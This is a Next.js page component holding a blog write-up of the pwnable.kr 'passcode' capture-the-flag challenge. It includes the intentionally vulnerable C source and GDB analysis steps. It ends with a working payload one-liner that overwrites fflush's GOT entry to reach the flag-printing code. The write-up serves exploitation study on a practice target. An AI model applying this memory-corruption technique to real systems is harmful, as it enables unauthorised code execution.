'use client';
import FooterBlog from "@/components/blog/Footer";
import HeaderBlog from "@/components/blog/HeaderBlog";
import TableContent from "@/components/blog/TableContent";
import SubHeader from "@/components/blog/SubHeader";
import SubPara from "@/components/blog/SubPara";
import SubImage from "@/components/blog/SubImage";
import { Divider, Link, Code } from "@nextui-org/react";
import { list_post } from "@/config/post";
import hljs from "highlight.js";
import 'highlight.js/styles/atom-one-dark.css';
import { useEffect } from "react";
export default function Page() {

    hljs.registerLanguage('c', require('highlight.js/lib/languages/c'));
    useEffect(() => {
        hljs.initHighlighting();
      }, []);
    const findDate = (header: string) => {
        // Check if list_post array exists and has items
        if (list_post && list_post.length > 0) {
            // Iterate through the array
            for (let i = 0; i < list_post.length; i++) {
                const post = list_post[i];
                // Check if the post object has the header property
                if (post && post.header === header) {
                    // Return the header value
                    return post.date;
                }
            }
            // If no header found in any post
            return "Header not found";
        } else {
            // If list_post array is empty or undefined
            return "No posts found";
        }
    };
    const date = findDate('Passcode');
    const items = [
        {
            key: 'Introduction',
            label: 'Introduction',
            idx: '#introduction'
        },
        {
            key: 'Exploit',
            label: 'Exploit',
            idx: '#exploit'
        },
    ];

    return (
        <div className="mt-3 w-[90%] md:w-4/5 mx-auto">
            <HeaderBlog name={'Passcode'} />
            <Divider />
            <TableContent items={items} />
            <div id="introduction" className="my-2">
                <SubHeader item={{ num: '1', content: 'Introduction' }} />
                <SubPara content={'This challenge is from passcode.kr. We learn about bugs in C programs and how to analyze them using GDB or other debugging tools.'} />
                <Link
                    href={'https://pwnable.kr/play.php'}
                    color="warning"
                    underline="hover"
                    target="_blank"
                >Link passcode challenge!</Link>
            </div>
            <div id="exploit" className="my-2">
                <SubHeader item={{ num: '2', content: 'Exploit' }} />
                <SubPara content={'Connect to the server over SSH and check the file named passcode.c.'} />
                <pre className=" h-[300px]  overflow-auto my-4 border-1 rounded-[2rem] p-1"><code className="c">{`//passcode.c
                    #include <stdio.h>
                    #include <stdlib.h>
                    
                    void login(){
                            int passcode1;
                            int passcode2;
                    
                            printf("enter passcode1 : ");
                            scanf("%d", passcode1);
                            fflush(stdin);
                    
                            // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
                            printf("enter passcode2 : ");
                            scanf("%d", passcode2);
                    
                            printf("checking...\\n");
                            if(passcode1==338150 && passcode2==13371337){
                                    printf("Login OK!\\n");
                                    system("/bin/cat flag");
                            }
                            else{
                                    printf("Login Failed!\\n");
                                    exit(0);
                            }
                    }
                    
                    void welcome(){
                            char name[100];
                            printf("enter you name : ");
                            scanf("%100s", name);
                            printf("Welcome %s!\\n", name);
                    }
                    
                    int main(){
                            printf("Toddler's Secure Login System 1.0 beta.\\n");
                    
                            welcome();
                            login();
                    
                            // something after login...
                            printf("Now I can safely trust you that you have credential :)\\n");
                            return 0;
                    }
                    `}
                </code></pre>
                <SubPara content={'You observe a warning regarding the scanf formatter about passcode1 and passcode2.'} />
                <SubImage img={{
                    alt: 'warning',
                    path: '/images/passcode/img1.png',
                    size: 400
                }} />
                <SubPara content={'The addr of passcode1: ebp-0x10, passcode2: ebp-0xc'} />
                <SubImage img={{
                    alt: 'img2',
                    path: '/images/passcode/img2.png',
                    size: 400
                }} />
                <SubPara content={'Generate a pattern with a length of 100 characters'} />
                <SubImage img={{
                    alt: 'img3',
                    path: '/images/passcode/img3.png',
                    size: 400
                }} />
                <SubPara content={'Set a breakpoint at the login function and pass the generated pattern to observe the values of passcode1 and passcode2'} />
                <SubImage img={{
                    alt: 'img4',
                    path: '/images/passcode/img4.png',
                    size: 400
                }} />

                <SubImage img={{
                    alt: 'img5',
                    path: '/images/passcode/img5.png',
                    size: 400
                }} />
                <SubPara content={'You can observe that passcode1 is overwritten starting at index 96. However, passcode2 cannot override it as it points to an address that does not exist, causing a segmentation fault when executed. Now you understand that from the scanf function, you can redirect the pointer to another function (passcode1). You can choose a function in the Global Offset Table (GOT) and then place the address to print the flag.'} />
                <SubImage img={{
                    alt: 'img6',
                    path: '/images/passcode/img6.png',
                    size: 400
                }} />
                <div className="overflow-x-auto">
                    <Code color="success" className="my-3">fflush:0x804a004 you need write it follow Little Endian</Code>
                </div>
                <SubImage img={{
                    alt: 'img7',
                    path: '/images/passcode/img7.png',
                    size: 400
                }} />
                <SubPara content={'You can verify the provided code. In the login function, the address 0x08048587 marks the beginning of the string to print \'Login OK\'. Change this addr to base-10(decimal number).'} />
                <SubImage img={{
                    alt: 'img8',
                    path: '/images/passcode/img8.png',
                    size: 400
                }} />
                <SubImage img={{
                    alt: 'img9',
                    path: '/images/passcode/img9.png',
                    size: 400
                }} />
                <SubPara content={'"Now, send the payload to the server and observe the result.'} />
                <div className="overflow-x-auto">
                    <Code color="success" className="my-3">{`python2 -c "print('a'*96 + '\x04\xa0\x04\x08' + '134514135')" | ./passcode`}</Code>
                </div>

                <SubImage img={{
                    alt: 'img10',
                    path: '/images/passcode/img10.png',
                    size: 400
                }} />
                <div className="overflow-x-auto">
                    <Code color="warning" className="my-3">Done!</Code>
                </div>
            </div>
            <FooterBlog date={date} />
        </div>
    );
}